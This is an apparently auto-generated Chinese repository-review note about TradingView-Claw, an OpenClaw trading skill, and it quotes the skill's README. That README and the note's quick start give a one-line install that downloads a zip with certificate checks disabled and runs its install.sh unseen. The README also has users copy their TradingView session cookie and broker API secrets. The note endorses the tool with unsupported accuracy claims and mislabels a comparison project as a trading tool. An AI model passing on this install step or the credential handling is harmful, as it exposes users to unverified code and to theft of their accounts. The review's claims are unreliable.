---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 332
stars_per_day: 83
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "開發工具"
subcategory: "自動化"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
use_case: "提供一個基於 TradingView 的自動交易技能，讓用戶能夠執行交易並追蹤市場走勢。"
priority: medium
ring: assess
discovered_via: "GitHub Trending"
appearances: 1
next_review: "2026-03-17"
contributor_count: 1
engagement: "low"
verdict: ""
ring_history: "assess@2026-03-10"
star_history: "2026-03-10:332"
tags:
  - github
  - "category/開發工具"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供一個基於 TradingView 的自動交易技能，讓用戶能夠執行交易並追蹤市場走勢。"
---

# TradingView-Claw

**332** stars · **83** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 提供一個基於 TradingView 的自動交易技能，讓用戶能夠執行交易並追蹤市場走勢。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (83 stars/day)
> **授權** MIT (商業友好) · **維護** Active (最後推送 2 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
> **適合** 希望在 TradingView 上自動化交易的獨立交易者或小型量化交易團隊。
> **一句話重點** TradingView-Claw 透過 LLM 技術提升了交易信號的準確性，讓自動交易變得更智能。

> [!question] TL;DR — 值得投入嗎？
> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~4h · **綁定風險** medium
> **結論** 花 4 小時學習，2 小時整合，得到一個強大的自動交易工具，值得考慮。

> [!abstract] 核心創新
> 結合 LLM 驅動的技術分析，提供高信心的交易信號。

## 專案簡介

TradingView-Claw 是一個為 OpenClaw 設計的交易技能，讓用戶能夠透過 TradingView 瀏覽圖表、執行交易並追蹤持倉。用戶可以使用 `tvclaw buy` 和 `tvclaw sell` 指令來開啟多頭或空頭持倉，並透過技術指標如 RSI 和 MACD 進行信號驅動的執行。該工具的賣點在於其結合了 LLM 驅動的技術分析，能夠過濾出統計上有意義的交易信號，並提供 S1 至 S3 的信號等級，幫助用戶做出更明智的交易決策。技術上，該專案使用 Python 和多個依賴庫如 httpx 和 pandas，並且設計為輕量級，便於安裝和使用。與其他交易工具相比，如 AlpinDale/parsync 和 binance/binance-skills-hub，TradingView-Claw 提供了更強的信號分析能力和更直觀的命令行介面。實際使用中，該工具能夠處理多個交易對的即時數據，並且支持多種經紀商的 API 整合，這使得它在小型到中型交易團隊中非常適合。使用者需要注意的是，該工具目前處於初期階段，可能會遇到一些尚未解決的問題，如 API 限制和信號準確性。總體來說，這是一個值得關注的工具，尤其是對於那些希望將自動交易整合到現有工作流中的開發者和交易者。

**技術棧**：`Python 3.10` · `httpx 0.27.0` · `websockets 12.0` · `pandas 2.0.0` · `numpy 1.26.0`

## 重點功能

- 即時圖表數據 — 使用 `tvclaw charts trending` 獲取當前熱門標的。
- 交易執行 — 使用 `tvclaw buy <symbol> <amount>` 和 `tvclaw sell <symbol> <amount>` 進行交易。
- 持倉追蹤 — 使用 `tvclaw positions` 列出當前持倉及其盈虧情況。
- 信號掃描 — 使用 `tvclaw signal scan` 掃描市場信號，並提供信號等級。
- 經紀商連接 — 使用 `tvclaw account connect` 進行一次性設置，連接經紀商 API。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
在 openclaw.json 中添加 TradingView 和經紀商的 API 金鑰
```
3. 連接經紀商
```bash
uv run python scripts/tvclaw.py account connect
```

## 程式碼範例

{
  "前置條件": "需要已安裝 TradingView-Claw 並配置好環境變數",
  "指令": "uv run python scripts/tvclaw.py buy AAPL 500",
  "預期輸出": "執行 AAPL 的買入訂單，並記錄持倉"
}

## 為什麼值得關注

> [!tip] 爆紅原因
> 建立 4 天就累積 332 stars（83/天），forks 0（0.0%），顯示出初期的高關注度。作者 helenigtxu 之前的專案可能在社群中已有一定的影響力，這次專案解決了自動化交易中對於技術分析和信號發現的需求。這個工具的出現，正好迎合了對於量化交易和自動化交易的需求，尤其是在 LLM 技術逐漸成熟的背景下。forks/stars 比率為 0.0%，顯示目前大多數用戶仍在觀望階段。

## 適合誰使用

**目標受眾**：希望在 TradingView 上自動化交易的獨立交易者或小型量化交易團隊。

> [!example] 使用場景
> - 量化交易者用它來自動化交易策略，因為它能夠透過 LLM 分析市場信號，提升交易決策的準確性。
> - 金融分析師用它來追蹤市場趨勢，因為它提供即時的圖表和技術指標，幫助他們快速做出反應。
> - 開發者用它來整合交易功能到自己的應用中，因為它的 CLI 介面簡單易用，且支持多種經紀商的 API。

## 架構分析

TradingView-Claw 採用模組化設計，主要由 CLI 和多個功能模組組成。使用者透過命令行介面與系統互動，並使用 Python 的多個庫來處理 API 請求和數據分析。資料流方面，交易指令會經過 TradingView 數據客戶端，然後提交到經紀商 API，並在本地 JSON 存儲中記錄持倉。這種設計使得系統能夠快速反應市場變化，但在高頻交易場景下可能會遇到延遲問題。整體架構輕量且易於擴展，適合小型團隊使用。

## 技術深入分析

TradingView-Claw 的核心技術機制在於其使用 LLM 進行市場信號分析，這使得它能夠過濾掉噪音並專注於統計上有意義的信號。該系統能夠處理即時的市場數據，並在用戶執行交易時提供即時反饋。效能方面，該工具在處理多個交易對時能夠保持良好的響應速度，但在高頻交易情境下可能會出現延遲。選擇 Python 作為開發語言使得開發過程更加靈活，但也可能導致在性能要求極高的情況下出現瓶頸。整體依賴樹較為簡單，主要依賴於幾個核心庫，降低了維護成本。技術風險方面，若 LLM 模型的準確性不足，可能會導致錯誤的交易決策，這是使用者需要特別注意的地方。整合方面，該工具能夠與主流的 CI/CD 工具鏈相容，但在特定環境下可能需要進行額外的配置。

## 新手體驗

> [!info] 上手難度評估
> README 文件提供了清晰的安裝步驟和範例，安裝過程相對順暢。對於新手來說，配置環境變數可能會有一定的學習曲線，但整體上能在 30 分鐘內完成設置並運行。文件目前僅提供英文版本，對於非英語使用者可能會造成困難。

## 優缺點分析

> [!success] 優點
> - 提供即時的市場數據和技術分析，幫助用戶快速做出交易決策。
> - 支持多種經紀商的 API 整合，擴展性強。
> - 簡單的 CLI 介面，易於使用和集成。

> [!danger] 缺點
> - 目前僅支援少數經紀商，限制了使用範圍。
> - 需要用戶自行管理 API 金鑰的安全性。
> - 初期階段，可能存在未解決的 bug 和功能不穩定。

> [!warning] 注意事項
> - 僅支援 Python 3.10+
> - 需要 TradingView 和經紀商的 API 金鑰
> - 目前僅支援少數經紀商，如 Alpaca 和 Binance

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 提供類似的自動交易功能，但缺乏 LLM 驅動的信號分析能力，適合對技術分析要求不高的用戶。 |
| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 專注於 Binance 平台的交易，但不支持多經紀商整合，限制了使用範圍。 |

## 替代方案決策

> [!question] 什麼時候該選別的工具？

| 工具 | 技術路線 | 選它的時機 | 遷移難度 |
| --- | --- | --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 使用 Python 實作，但不具備 LLM 驅動的信號分析功能，主要依賴傳統技術指標。 | 如果你的團隊需要一個輕量級的交易工具，且不需要複雜的信號分析。 | low，因為兩者都使用 Python，且功能相似。 |
| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 專注於 Binance 平台的交易，提供多種交易策略，但不支持多經紀商整合。 | 如果你的交易主要集中在 Binance，並且需要專門的功能。 | medium，因為需要適應不同的 API 和功能設置。 |

> [!abstract]- 功能對比矩陣
>
> | 維度 | **TradingView-Claw** | **parsync** | **binance-skills-hub** |
> | --- | --- | --- | --- |
> | 技術路線 | 本專案 | 使用 Python 實作，但不具備 LLM 驅動的信號分析功能，主要依賴傳統技術指標。 | 專注於 Binance 平台的交易，提供多種交易策略，但不支持多經紀商整合。 |
> | 遷移成本 | - | low，因為兩者都使用 Python，且功能相似。 | medium，因為需要適應不同的 API 和功能設置。 |
> | 適用場景 | 主要場景 | 如果你的團隊需要一個輕量級的交易工具，且不需要複雜的信號分析 | 如果你的交易主要集中在 Binance，並且需要專門的功能。 |

## 成熟度評估

| 項目 | 評估 |
| --- | --- |
| 開發階段 | Alpha |
| 生產環境就緒 | No |
| Breaking Change 風險 | high |

> [!tip] 採用建議
> 目前適合用於個人實驗性質的交易，不建議在生產環境中使用。

## 已知陷阱

> [!bug] 踩坑才知道的問題

- **[HIGH]** 在某些情況下，API 認證可能失敗，導致無法連接經紀商
  - 解法：檢查 API 金鑰和密碼是否正確，並確保經紀商支持的 API。
- [MEDIUM] 信號掃描結果可能因模型準確性不足而不準確
  - 解法：使用更高效的模型或調整信號掃描參數。
- [MEDIUM] 在高頻交易時可能出現延遲
  - 解法：減少同時執行的交易數量，或使用更快的網絡連接。

## 使用情境適合度

| 情境 | 適合度 | 說明 |
| --- | --- | --- |
| 獨立交易者希望自動化其交易策略 | 非常適合 | 該工具提供了強大的信號分析和交易執行功能，能夠提升交易效率。 |
| 小型量化交易團隊需要快速整合交易功能 | 適合 | 簡單的 CLI 介面和多經紀商支持使得整合過程相對容易。 |
| 大型金融機構需要高頻交易解決方案 | 不適合 | 目前的設計在高頻交易場景下可能會遇到延遲問題。 |
| 對交易信號準確性要求極高的專業交易者 | 普通 | 雖然有 LLM 驅動的信號分析，但模型準確性仍需提升。 |

## 採用成本分析

| 項目 | 評估 |
| --- | --- |
| 學習時間 | ~4 小時 |
| 整合時間 | ~2 小時 |
| 維護負擔 | medium |
| 綁定風險 | medium |

> [!tip] 投入 vs 回報
> 花 4 小時學習，2 小時整合，得到一個強大的自動交易工具，值得考慮。

## 安全性評估

> [!warning] 安全性快速掃描
> 該工具需要用戶提供經紀商的 API 金鑰，這可能會帶來安全風險。建議使用者在交易賬戶中僅保留小額資金，並使用子賬戶來限制權限。

## 健康度儀表板

> [!abstract]- 專案健康度綜合評估
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : null;
>   const forkRatio = me.stars > 0 ? ((me.forks || 0) / me.stars * 100).toFixed(1) : 0;
>   const issueRatio = me.stars > 0 ? ((me.open_issues || 0) / me.stars * 100).toFixed(1) : 0;
>   const maint = daysSincePush === null ? "?" : daysSincePush <= 7 ? "Active" : daysSincePush <= 30 ? "Moderate" : "Stale";
>   const busFactor = (me.forks || 0) > 50 ? "Good" : (me.forks || 0) > 10 ? "OK" : "Risk";
>   dv.table(["指標", "值", "評估"], [
>     ["維護狀態", daysSincePush + " 天前推送", maint],
>     ["專案年齡", age + " 天", age > 180 ? "Established" : age > 30 ? "Growing" : "Brand New"],
>     ["Fork 比率", forkRatio + "%", parseFloat(forkRatio) > 20 ? "High adoption" : parseFloat(forkRatio) > 5 ? "Normal" : "Low"],
>     ["Issue 密度", issueRatio + "%", parseFloat(issueRatio) > 5 ? "High" : "Normal"],
>     ["Bus Factor", (me.forks || 0) + " forks", busFactor],
>   ]);
> }
> ```

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |
| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/helenigtxu/TradingView-Claw) |
| Topics | `ai-auto-trading` `ai-trading` `ai-trading-bots` `al-trading` `bot-trading` `openclaw-skill` `quantitave-trading` `trading-api` |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## 社群與生態

**社群活躍度**：社群活躍度尚可，無開放的 Discord 或論壇支持。
**連結**：[文件](https://github.com/helenigtxu/TradingView-Claw)

## 開發動態

> [!abstract] 最近 10 次 commit（2026-03-06 ~ 2026-03-09）
> **活躍天數** 2 天 · **最新 commit** Initial commit

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompts
> 
> Natural language prompts you can use with OpenClaw:
> 
> ### 1. Browse trending charts
> 
> ```
> What's trending on TradingView right now?
> ```
> 
> Returns symbol list, prices, volume, and momentum scores.
> 
> ### 2. Get chart details
> 
> ```
> Show me details for TSLA
> ```
> 
> Returns OHLCV data, RSI, MACD, and support/resistance levels.
> 
> ### 3. Check account status
> 
> ```
> What's my TradingView-Claw account balance?
> ```
> 
> Shows broker connection, buying power, and open positions.
> 
> ### 4. Direct trading
> 
> ```
> Buy $500 of NVDA
> ```
> 
> Executes order via connected broker and records position.
> 
> ### 5. Signal discovery flow
> 
> ```
> Find me strong trading signals right now
> ```
> 
> or more specifically:
> 
> ```
> Run signal scan limit 10
> ```
> 
> > **Note:** This takes a moment. The skill fetches symbols, runs indicator analysis, and sends setups to the LLM for confirmation scoring.
> 
> Review the results — you'll see signal tiers (S1 = 95%+, S2 = 90–95%, S3 = 85–90%) and actionable entry points.
> 
> ### 6. Check positions
> 
> ```
> Show my TradingView-Claw positions
> ```
> 
> Lists open positions with entry price, current price, and P&L.
> 
> ### 7. Close a position
> 
> ```
> Sell my NVDA position
> ```
> 
> Closes your position at current market price.
> 
> ### Full Flow Example
> 
> 1. **"What's trending on TradingView?"** → Get symbol list
> 2. **"Run signal scan limit 10"** → Wait for LLM analysis
> 3. Review signal tiers and setups
> 4. **"Buy $300 of AAPL"** → Enter position
> 5. **"Show my positions"** → Track P&L live
> 
> ---
> 
> ## Environment Variables
> 
> | Variable | Required | Description |
> |---|---|---|
> | `TRADINGVIEW_SESSION` | Yes (data) | TradingView session cookie |
> | `BROKER_API_KEY` | Yes (trading) | Broker/exchange API key |
> | `BROKER_API_SECRET` | Yes (trading) | Broker/exchange API secret |
> | `OPENROUTER_API_KEY` | Yes (signals) | OpenRouter API key for LLM |
> | `HTTPS_PROXY` | No | Use if data requests are rate-limited |
> | `MAX_RETRIES` | No | Max retries for API calls (default: 5) |
> 
> ---
> 
> ## Directory Structure
> 
> ```
> TradingView-Claw/
> ├── SKILL.md                     # OpenClaw skill manifest
> ├── README.md                    # This file
> ├── install.sh                   # macOS one-command installer
> ├── pyproject.toml               # Python dependencies (uv)
> │
> ├── scripts/
> │   ├── tvclaw.py                # CLI dispatcher
> │   ├── charts.py                # Chart & market data
> │   ├── account.py               # Account management
> │   ├── trade.py                 # Order execution
> │   ├── positions.py             # Position tracking + P&L
> │   └── signals.py               # LLM signal discovery
> │
> └── lib/
>     ├── __init__.py              # Package marker
>     ├── tv_client.py             # TradingView data client
>     ├── broker_client.py         # Broker API wrapper
>     ├── indicators.py            # RSI, MACD, Bollinger Bands
>     ├── signal_engine.py         # Signal scoring + tiers
>     ├── llm_client.py            # OpenRouter LLM client
>     └── position_storage.py      # Position JSON storage
> ```
> 
> ---
> 
> ## Trading Flow
> 
> 1. **Connect broker** (one-time): `tvclaw account connect`
> 2. **Execute trade**: `tvclaw buy AAPL 500`
>    * Fetch current price via TradingView data feed
>    * Validate signal strength via indicator suite
>    * Submit order to broker API
>    * Record position to local JSON store
> 3. **Track position**: `tvclaw positions`
> 
> ---
> 
> ## Signal Discovery Flow
> 
> 1. **Scan symbols**: `tvclaw signal scan --query "tech"`
> 2. **Review output**: Table shows Tier, Signal, Entry, Target, Stop
> 3. **Analyze pair**: `tvclaw signal analyze AAPL MSFT`
> 4. **Execute if valid**: Place order based on setup
> 
> **Signal tiers:**
> 
> * **Tier S1 (STRONG):** ≥95% confluence — high-confidence setup
> * **Tier S2 (GOOD):** 90–95% — solid setups
> * **Tier S3 (MODERATE):** 85–90% — acceptable but watch closely
> * **Tier S4 (WEAK):** <85% — filtered by default
> 
> ---
> 
> ## Troubleshooting
> 
> ### "No broker connection"
> 
> Run the account connect setup:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> ### "TRADINGVIEW_SESSION not set"
> 
> Set

## 延伸閱讀

相關概念：[[量化交易]] · [[自動化]] · [[技術分析]]

相關專案：[[AlpinDale--parsync|AlpinDale/parsync]] · [[binance--binance-skills-hub|binance/binance-skills-hub]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[duoan--TorchCode|duoan/TorchCode]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 直接競品（同子分類：自動化）
> ```dataview
> TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
> FROM "Repos"
> WHERE subcategory = "自動化" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "開發工具" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同語言的熱門專案
> ```dataview
> TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
> FROM "Repos"
> WHERE language = "Python" AND file.name != "helenigtxu--TradingView-Claw" AND status != "archived"
> SORT stars_per_day DESC
> LIMIT 5
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

> [!note]- 共用概念的相關專案
> ```dataviewjs
> const concepts = ["量化交易","自動化","技術分析"];
> const pages = dv.pages('"Repos"')
>   .where(p => p.file.name !== "helenigtxu--TradingView-Claw" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
>   .sort(p => p.stars, "desc")
>   .limit(5);
> if (pages.length > 0) {
>   dv.table(["專案", "Stars", "分類", "共用概念"], pages.map(p => {
>     const shared = concepts.filter(c => p.file.outlinks?.some(l => l.path?.includes(c)));
>     return [p.file.link, p.stars, p.category, shared.join(", ")];
>   }));
> } else { dv.paragraph("_目前沒有共用概念的相關專案_"); }
> ```

## 同 Owner 專案

> [!note]- 這位開發者的其他收錄專案
> ```dataview
> TABLE stars AS "Stars", category AS "分類", status AS "狀態"
> FROM "Repos"
> WHERE owner = "helenigtxu" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

## Vault 排名

> [!abstract]- 這個專案在 vault 中的相對位置
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
> const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const catAll = all.where(p => p.category === me?.category);
> const catRank = catAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const totalStarsAll = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars || 0, "desc");
> const starsRank = totalStarsAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> if (rank > 0) {
>   const pct = Math.round((1 - rank / all.length) * 100);
>   dv.paragraph(`Stars/天排名：**全 vault 第 ${rank}**/${all.length}（前 ${100 - pct}%）· **${me.category} 第 ${catRank}**/${catAll.length}\nStars 總量排名：**第 ${starsRank}**/${totalStarsAll.length}`);
> }
> ```

## Star 趨勢

> [!abstract]- Stars 成長追蹤
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me?.star_history) {
>   const raw = me.star_history.toString();
>   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
>   if (points.length >= 2) {
>     const max = Math.max(...points.map(p => p.stars));
>     const lines = points.map(p => {
>       const w = Math.round(p.stars / max * 25);
>       return `${p.date} ${"\u2588".repeat(w)}${"\u2591".repeat(25-w)} ${p.stars.toLocaleString()}`;
>     });
>     const first = points[0].stars;
>     const last = points[points.length-1].stars;
>     const growth = first > 0 ? Math.round((last - first) / first * 100) : 0;
>     lines.push(`\n**成長** +${(last-first).toLocaleString()} stars（${growth}%）in ${points.length} snapshots`);
>     // 趨勢方向偵測
>     if (points.length >= 3) {
>       const mid = Math.floor(points.length / 2);
>       const fh = points.slice(0, mid), sh = points.slice(mid);
>       const rateF = fh.length > 1 ? (fh[fh.length-1].stars - fh[0].stars) / Math.max(1, (new Date(fh[fh.length-1].date) - new Date(fh[0].date)) / 86400000) : 0;
>       const rateS = sh.length > 1 ? (sh[sh.length-1].stars - sh[0].stars) / Math.max(1, (new Date(sh[sh.length-1].date) - new Date(sh[0].date)) / 86400000) : 0;
>       const ratio = rateF > 0 ? rateS / rateF : rateS > 0 ? 2 : 1;
>       const dir = ratio > 1.3 ? "Rising（加速中）" : ratio < 0.7 ? "Cooling（降溫中）" : "Stable（穩定）";
>       lines.push(`**趨勢方向** ${dir}（加速比 ${Math.round(ratio * 100) / 100}x）`);
>     }
>     dv.paragraph(lines.join("\n"));
>   } else { dv.paragraph("需要 2+ 次快照才能顯示趨勢"); }
> } else { dv.paragraph("尚無 star_history 資料（下次出現在 trending 時會開始追蹤）"); }
> ```

## 相對成長速度

> [!abstract]- 跟 vault 中同類專案比較
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
>   const sameCat = all.where(p => p.category === me.category);
>   const avgAll = all.length > 0 ? Math.round(all.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / all.length) : 0;
>   const avgCat = sameCat.length > 0 ? Math.round(sameCat.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / sameCat.length) : 0;
>   const mySpd = me.stars_per_day || 0;
>   const vsAll = avgAll > 0 ? Math.round(mySpd / avgAll * 100) : 0;
>   const vsCat = avgCat > 0 ? Math.round(mySpd / avgCat * 100) : 0;
>   dv.table(["比較對象", "平均 Stars/天", "本專案", "倍數"], [
>     ["全 Vault", avgAll, mySpd, vsAll + "%"],
>     ["同分類 (" + me.category + ")", avgCat, mySpd, vsCat + "%"],
>   ]);
>   if (vsAll >= 300) dv.paragraph("**極速成長** — 成長速度是 vault 平均的 3 倍以上");
>   else if (vsAll >= 150) dv.paragraph("**高速成長** — 成長速度高於 vault 平均");
>   else if (vsAll >= 50) dv.paragraph("**正常速度** — 接近 vault 平均水平");
>   else dv.paragraph("**低速成長** — 低於 vault 平均，可能已過熱度高峰");
> }
> ```

## 決策分數

> [!abstract]- 綜合評估（自動計算）
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   let score = 0;
>   let breakdown = [];
>   // 熱度 (0-25)
>   const spd = me.stars_per_day || 0;
>   const heat = Math.min(25, Math.round(spd / 40 * 25));
>   score += heat; breakdown.push(`熱度: ${heat}/25`);
>   // 安裝難度 (0-20)
>   const inst = me.install_complexity === "easy" ? 20 : me.install_complexity === "medium" ? 12 : 5;
>   score += inst; breakdown.push(`易用性: ${inst}/20`);
>   // 成熟度 (0-20)
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : 0;
>   const mat = age > 365 ? 20 : age > 180 ? 16 : age > 30 ? 10 : 5;
>   score += mat; breakdown.push(`成熟度: ${mat}/20`);
>   // 社群 (0-20)
>   const forks = me.forks || 0;
>   const comm = forks > 200 ? 20 : forks > 50 ? 15 : forks > 10 ? 10 : 5;
>   score += comm; breakdown.push(`社群: ${comm}/20`);
>   // 授權 (0-15)
>   const lic = me.license || "";
>   const friendly = ["MIT","Apache-2.0","BSD-2-Clause","BSD-3-Clause","ISC","Unlicense"].includes(lic);
>   const licScore = friendly ? 15 : lic && lic !== "N/A" ? 8 : 0;
>   score += licScore; breakdown.push(`授權: ${licScore}/15`);
>   const grade = score >= 80 ? "A" : score >= 60 ? "B" : score >= 40 ? "C" : "D";
>   const bar = "\u2588".repeat(Math.round(score/5)) + "\u2591".repeat(20 - Math.round(score/5));
>   dv.paragraph(`## ${grade} (${score}/100)\n${bar}\n\n${breakdown.join(" | ")}`);
> }
> ```

---

## 個人筆記

> [!abstract]- 評估進度
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const steps = [
>     { name: "已讀", done: me.status && me.status !== "to-review" },
>     { name: "已評分", done: (me.my_rating || 0) > 0 },
>     { name: "有結論", done: me.verdict && me.verdict !== "" },
>     { name: "Ring 決策", done: me.ring && me.ring !== "" && me.ring !== "assess" },
>     { name: "試用記錄", done: me.status === "tried" || me.status === "integrated" },
>   ];
>   const done = steps.filter(s => s.done).length;
>   const pct = Math.round((done / steps.length) * 100);
